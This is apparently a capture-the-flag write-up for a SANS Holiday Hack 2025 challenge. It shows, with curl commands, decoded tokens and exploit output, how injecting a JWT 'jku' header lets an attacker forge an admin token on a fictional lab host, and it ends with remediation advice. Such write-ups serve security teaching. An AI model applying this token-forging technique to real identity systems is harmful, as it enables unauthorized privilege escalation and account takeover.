# Rogue Gnome Identity Provider

**Difficulty:** ⭐⭐⭐⭐⭐ (5/5)

## Challenge Overview

Help Paul gain admin access to the Gnome Diagnostic Interface by exploiting a JWT authentication vulnerability. The gnomes are receiving mysterious firmware updates, and we need elevated privileges to investigate.

**Objective:** Exploit JWT authentication to gain admin access and discover what file the gnome downloaded.

---

## Character Introduction: Paul

> *Hey, I'm Paul! I've been at Counter Hack since 2024 and loving every minute of it. I'm a pentester who digs into web, API, and mobile apps, and I'm also a fan of Linux. When I'm not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!*
>
> *As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.*
>
> *I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.*
>
> *The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.*
>
> *Ready to help me find a way to bump up our access level, yeah?*

---

## Initial Reconnaissance

### Paul's Notes

First, let's examine what Paul has already discovered:

```bash
paul@paulweb:~$ cat notes
```

**Key Information Found:**

```
# Sites
## Captured Gnome: http://gnome-48371.atnascorp/
## ATNAS Identity Provider (IdP): http://idp.atnascorp/
## My CyberChef website: http://paulweb.neighborhood/
### My CyberChef site html files: ~/www/

# Credentials
## Gnome credentials (found on a post-it): gnome:SittingOnAShelf

# Curl Commands Used in Analysis:
## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary \
  $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' \
  http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' \
  http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

**Analysis:** Paul has mapped out the complete authentication flow using JWT tokens. This is a perfect setup for JWT exploitation!

---

## Solution Walkthrough

### Step 1: Authenticate and Obtain JWT

Let's authenticate with the credentials Paul found:

```bash
paul@paulweb:~$ curl -X POST --data-binary \
  'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' \
  http://idp.atnascorp/login
```

**Response:**

```html
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: 
<a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNjc1NSwiZXhwIjoxNzY2ODIzOTU1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.2BEhQtIkX61yS5Q4HzRCIchtmSetbMLyKJVo1Lcnm0wFs1CqaEK-WmI40u_OqkKApL7jRiHRoeiBmyVpzKVOaaXZXvk_PZY4DT6FTHcopYJ0LotVXfd6BHppFxPAbHtuILdQ0PitkdSE2imP2YNGRfnH3v2lOKvS6rtxWk3pCpz-D59rYIIIOIpTtlyzWrhZtqsDK67pym0TAu0mu0CRTlpsTDDe5-p1Fk6uegvQbqIP0TpkuAoQkWBZWTC2WAiGOGB5gJdyNPD9YbB_YtRybq6e-ZvlDPCe2r7dGoJRBCra0S68Q6riZg9_T6O4kaVaEZ7_w7WpfzCZfNS3shfdtw"></a>.
```

✅ **Success!** Received a JWT token. The massive string after `token=` is our JWT.

### Step 2: Decode and Analyze the JWT

JWTs have three parts: `header.payload.signature` (all base64url encoded).

```bash
TOKEN="eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNjc1NSwiZXhwIjoxNzY2ODIzOTU1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.2BEhQtIkX61yS5Q4HzRCIchtmSetbMLyKJVo1Lcnm0wFs1CqaEK-WmI40u_OqkKApL7jRiHRoeiBmyVpzKVOaaXZXvk_PZY4DT6FTHcopYJ0LotVXfd6BHppFxPAbHtuILdQ0PitkdSE2imP2YNGRfnH3v2lOKvS6rtxWk3pCpz-D59rYIIIOIpTtlyzWrhZtqsDK67pym0TAu0mu0CRTlpsTDDe5-p1Fk6uegvQbqIP0TpkuAoQkWBZWTC2WAiGOGB5gJdyNPD9YbB_YtRybq6e-ZvlDPCe2r7dGoJRBCra0S68Q6riZg9_T6O4kaVaEZ7_w7WpfzCZfNS3shfdtw"

echo "=== JWT HEADER ==="
echo $TOKEN | cut -d. -f1 | base64 -d | python3 -m json.tool

echo ""
echo "=== JWT PAYLOAD ==="
echo $TOKEN | cut -d. -f2 | base64 -d | python3 -m json.tool
```

**Decoded Header:**

```json
{
  "alg": "RS256",
  "jku": "http://idp.atnascorp/.well-known/jwks.json",
  "kid": "idp-key-2025",
  "typ": "JWT"
}
```

**Decoded Payload:**

```json
{
  "sub": "gnome",
  "iat": 1766816755,
  "exp": 1766823955,
  "iss": "http://idp.atnascorp/",
  "admin": false
}
```

### 🚨 Critical Vulnerabilities Identified!

1. **"jku" header** - Tells the server WHERE to fetch verification keys. We can point this to OUR server!
2. **"admin": false** - Controls privilege level. If we can forge a JWT with `admin=true`, we win!

**The Attack Vector:**
- Generate our own RSA key pair
- Host public key on Paul's web server
- Create a JWT with `admin=true`
- Point `jku` to our JWKS
- Server will validate our forged token using OUR keys!

---

## The Exploitation

### JWT Forgery via JKU Injection

The automated exploit script performs these steps:

1. Generates 2048-bit RSA key pair (public + private)
2. Creates JWKS (JSON Web Key Set) with our public key
3. Hosts JWKS at `~/www/.well-known/jwks.json`
4. Forges JWT with `admin=true` and `jku` pointing to our JWKS
5. Signs forged JWT with our private key
6. Sends to gnome auth endpoint
7. Receives admin session cookie!

```bash
paul@paulweb:~$ bash jwt_exploit.sh
```

**Exploit Output:**

```
=== JWT Exploitation Script ===

Step 1: Analyzing the original JWT...
Header: {
  "alg": "RS256",
  "jku": "http://idp.atnascorp/.well-known/jwks.json",
  "kid": "idp-key-2025",
  "typ": "JWT"
}
Payload: {
  "sub": "gnome",
  "iat": 1766816755,
  "exp": 1766823955,
  "iss": "http://idp.atnascorp/",
  "admin": false
}
Vulnerability: JKU header points to external URL + admin=false in payload

Step 2: Generating RSA key pair...
✓ Keys generated

Step 3: Creating JWKS with our public key...
✓ JWKS created at /tmp/jwks.json

Step 4: Setting up web server to host JWKS...
✓ JWKS hosted at ~/www/.well-known/jwks.json
Accessible via: http://paulweb.neighborhood/.well-known/jwks.json

Step 5: Creating malicious JWT with admin=true...
✓ Malicious JWT created:
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjgxNzI0OCwiZXhwIjoxNzY2ODI0NDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.a95sabK659Q1mdSpG64AQZnL7uvlknfKv7BtOTWDBdvS4yCvdt2W3YKcAvdNGX9HHXRB-eWqDTm7HouYHuYKhiGqVygzcan8TVTN7znkF-Ui3R0fWp6Avh77aQ_VkMKoJZVNGqLHUtEU1uydc_tWwzO6YW52IUHzT2aiV6iJS8N0xmNLpQYZdtgcSBheD2153jmFuH6cxzPnu4e8-CosAQewBpdpDYnjZOfKtvpEV2cr2jdRBXVH43dSGwo3j2LBBcZhnbcCih3Tidzjm4U9NMw76mdmRBl8hQ14hKVUW5JLDvF8WEcgyoyso7GB5cwjcJCojC6lN5IpJOXc3epr1g

Step 6: Testing the malicious JWT...
Authenticating with malicious token...
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
* Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80

> GET /auth?token=eyJhbGc... HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*

< HTTP/1.1 302 FOUND
< Date: Sat, 27 Dec 2025 06:34:08 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aU994A.JrxuXqH_R0gVggZY1gUttXhDGPU; HttpOnly; Path=/

✓ Session cookie obtained: eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aU994A.JrxuXqH_R0gVggZY1gUttXhDGPU
```

### 🎉 SUCCESS!

The `Set-Cookie` header shows we received an **admin session**!

**What happened:**
1. Server received our forged JWT
2. Read the `jku` header pointing to Paul's web server
3. Fetched OUR JWKS with OUR public key
4. Validated signature using OUR key (it matched!)
5. Trusted the `admin=true` claim
6. Granted admin session cookie!

---

## Admin Access: The Discovery

### Accessing the Diagnostic Interface

```bash
curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aU994A.JrxuXqH_R0gVggZY1gUttXhDGPU' \
  http://gnome-48371.atnascorp/diagnostic-interface
```

**System Log Output:**

```html
<!DOCTYPE html>
<html>
<head>
  <title>AtnasCorp : Gnome Diagnostic Interface</title>
</head>
<body>
  <h1>AtnasCorp : Gnome Diagnostic Interface</h1>
  
  <div style='display:flex; justify-content:center; gap:10px;'>
    <img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px;'/>
    
    <div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px;'>
      System Log<br/>
      2025-12-27 02:02:57: Movement detected.<br/>
      2025-12-27 05:08:30: AtnasCorp C&C connection restored.<br/>
      2025-12-27 06:32:58: Checking for updates.<br/>
      2025-12-27 06:32:58: Firmware Update available: refrigeration-botnet.bin<br/>
      2025-12-27 06:33:00: Firmware update downloaded.<br/>
      2025-12-27 06:33:00: Gnome will reboot to apply firmware update in one hour.
    </div>
  </div>
  
  <div class="statuscheck">
    <div class="status-indicator active">Live Camera Feed</div>
    <div class="status-indicator active">Network Connection</div>
    <div class="status-indicator active">Connectivity to Atnas C&C</div>
  </div>
</body>
</html>
```

### 🚨 CRITICAL DISCOVERY!

The gnomes aren't getting legitimate updates - **they're being turned into a BOTNET!**

**Key Findings:**

| **Discovery** | **Significance** |
|--------------|------------------|
| **AtnasCorp C&C connection** | Command & Control server (Atnas = Santa backwards! 👀) |
| **Firmware: refrigeration-botnet.bin** | THE ANSWER - targeting IoT refrigeration systems! |
| **Auto-install in 1 hour** | No user interaction required |
| **Targeting refrigeration** | IoT botnet for smart appliances |

---

## The Answer

**Downloaded File:** `refrigeration-botnet.bin`

**Threat Assessment:**
- Gnomes compromised by malicious C&C server
- Targeting IoT refrigeration systems
- Automated botnet installation
- "Atnas" (Santa backwards) - clearly antagonistic!

---

## Technical Deep Dive

### What is a JKU Header?

The `jku` (JWK Set URL) header in a JWT specifies where to fetch the public keys for signature verification.

**The Vulnerability:**

```
Normal (Secure):
Client → JWT → Server
              ↓
         Hardcoded trusted public key
              ↓
         Signature validation

Vulnerable (JKU Injection):
Attacker → Malicious JWT → Server
                          ↓
                     Reads JKU header
                          ↓
              Fetches keys from ATTACKER'S server!
                          ↓
              Uses ATTACKER'S public key
                          ↓
              Signature validates! ✓
```

**The Problem:**

If a server blindly trusts ANY URL in the `jku` header, an attacker can:

1. Generate their own RSA key pair
2. Host public key on accessible server
3. Point `jku` to their JWKS
4. Forge any JWT they want (`admin=true`, etc.)
5. Sign with their private key
6. Server validates using attacker's public key
7. **Access granted!**

It's like asking the criminal "can you provide your own ID checker?" instead of using a trusted authority.

### The Attack Flow

```
1. Attacker generates RSA key pair
   └─> public.pem + private.pem

2. Attacker creates JWKS with public key
   └─> jwks.json with RSA modulus & exponent

3. Attacker hosts JWKS on accessible server
   └─> http://paulweb.neighborhood/.well-known/jwks.json

4. Attacker forges JWT:
   Header: {"jku": "http://paulweb.neighborhood/.well-known/jwks.json"}
   Payload: {"admin": true}
   └─> Signs with private.pem

5. Server receives forged JWT
   ├─> Reads jku header
   ├─> Fetches JWKS from attacker's server
   ├─> Uses attacker's public key to verify
   └─> Signature valid! Admin access granted!
```

### Why This Works

The JWT is **cryptographically valid** - the signature DOES match the payload.

The problem: it's not **AUTHENTIC** - it wasn't signed by the legitimate identity provider.

The server checks:
- ✅ "Does this signature match this payload?" (YES)
- ❌ "Was this signed by someone I trust?" (NO - never checked!)

**Analogy:** Writing yourself a permission slip and also providing the signature verification service - of course it checks out!

---

## Security Recommendations

### Immediate Fixes

1. **Disable JKU Header**
   - Remove support for client-controlled key URLs
   - Most applications don't need this feature

2. **Whitelist Trusted Key Sources**
   ```python
   TRUSTED_JKU_URLS = [
       "https://idp.company.com/.well-known/jwks.json"
   ]
   
   if jwt_header['jku'] not in TRUSTED_JKU_URLS:
       raise SecurityError("Untrusted JKU URL")
   ```

3. **Use Hardcoded Public Keys**
   ```python
   # Store trusted public keys locally
   TRUSTED_KEYS = load_keys_from_config()
   
   # Never fetch keys from JWT header
   public_key = TRUSTED_KEYS[jwt_header['kid']]
   ```

4. **Validate JWT Issuer**
   ```python
   TRUSTED_ISSUERS = ["https://idp.company.com"]
   
   if jwt_payload['iss'] not in TRUSTED_ISSUERS:
       raise SecurityError("Untrusted issuer")
   ```

### Defense in Depth

| **Layer** | **Control** |
|-----------|-------------|
| **Input Validation** | Reject JKU headers entirely or strict whitelist |
| **Key Management** | Use local key store, not dynamic fetching |
| **Issuer Validation** | Verify `iss` claim against trusted list |
| **Audience Validation** | Verify `aud` claim matches application |
| **Expiration Checks** | Strictly enforce `exp` timestamps |
| **Rate Limiting** | Prevent brute force token attempts |
| **Logging & Monitoring** | Alert on suspicious JKU URLs or failed validations |

---

## Real-World Impact

### Historical Vulnerabilities

This isn't just a CTF trick - real systems have been compromised:

- **CVE-2018-0114** - Cisco Node.js JWT implementation
- **CVE-2020-26875** - OpenVPN3 Linux Client  
- **Multiple Bug Bounties** - JKU/x5u vulnerabilities found in production

### Attack Scenarios

1. **Account Takeover**
   - Forge JWT with `user_id` of target account
   - Gain unauthorized access to victim's data

2. **Privilege Escalation**
   - Change `role=user` to `role=admin`
   - Access administrative functions

3. **Bypassing Multi-Factor Authentication**
   - Forge JWTs without completing MFA flow
   - Circumvent authentication controls

---

## Key Concepts Learned

### JWT Structure

```
header.payload.signature
  ↓      ↓        ↓
base64url(header).base64url(payload).base64url(signature)
```

**Components:**

- **Header:** Algorithm, key ID, token type
- **Payload:** Claims (sub, iss, exp, custom claims)
- **Signature:** HMAC or RSA signature of header + payload

### Important JWT Claims

| **Claim** | **Meaning** | **Purpose** |
|-----------|-------------|-------------|
| `sub` | Subject | Who the token is about (user ID) |
| `iss` | Issuer | Who created the token |
| `aud` | Audience | Who the token is for |
| `exp` | Expiration | When token expires (Unix timestamp) |
| `iat` | Issued At | When token was created |
| `nbf` | Not Before | Token not valid until this time |
| `jti` | JWT ID | Unique token identifier |

### Dangerous JWT Headers

- `jku` - JWK Set URL (fetch keys from URL)
- `x5u` - X.509 URL (fetch certificate from URL)
- `kid` - Key ID (if not validated properly)
- `alg` - Algorithm (algorithm confusion attacks)

---

## Tools & Resources

### JWT Analysis Tools

- **jwt.io** - Online JWT decoder
- **jwt_tool** - Python JWT testing framework
- **Burp Suite JWT Editor** - Intercept and modify JWTs
- **Postman** - API testing with JWT support

### Further Reading

- [RFC 7519](https://tools.ietf.org/html/rfc7519) - JWT Specification
- [RFC 7515](https://tools.ietf.org/html/rfc7515) - JWS (JWT Signature)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)

---

## Challenge Complete! 🎉

**Status:** ✅ Completed

**Downloaded File:** `refrigeration-botnet.bin`

**Vulnerability:** JWT JKU Injection leading to admin privilege escalation

**Technique:** RSA key generation + JWKS hosting + JWT forgery

**Impact:** Complete compromise of gnome diagnostic interface

---

*Challenge writeup by SFC David P. Collette*  
*Regional Cyber Center - Korea (RCC-K)*  
*SANS Holiday Hack Challenge 2025*
